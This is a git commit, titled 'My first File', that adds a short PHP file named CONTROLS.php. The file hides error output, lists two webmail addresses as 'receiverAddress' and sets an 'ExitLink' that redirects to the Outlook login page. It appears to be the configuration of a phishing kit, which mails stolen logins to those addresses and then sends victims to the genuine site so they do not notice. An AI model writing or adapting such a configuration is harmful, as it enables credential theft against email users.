af4f98583f304ccb612ea496d5caae236936f397
chelsea <chelsea09@yahoo.com>
2022-09-13 22:32:51 +0200

    My first File

---
+++ CONTROLS.php
@@ -0,0 +1,6 @@
+<?php
+ini_set('display_errors', 0);
+$receiverAddress = "e0836290@gmail.com,adm.chr@aol.com";
+$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjm78ekvYXdAhUFV8AKHWWcBAoQFjAAegQIBBAC&url=https%3A%2F%2Foutlook.live.com%2F&usg=AOvVaw0ehqvNiTCQke_GULULE7bE"
+
+?>
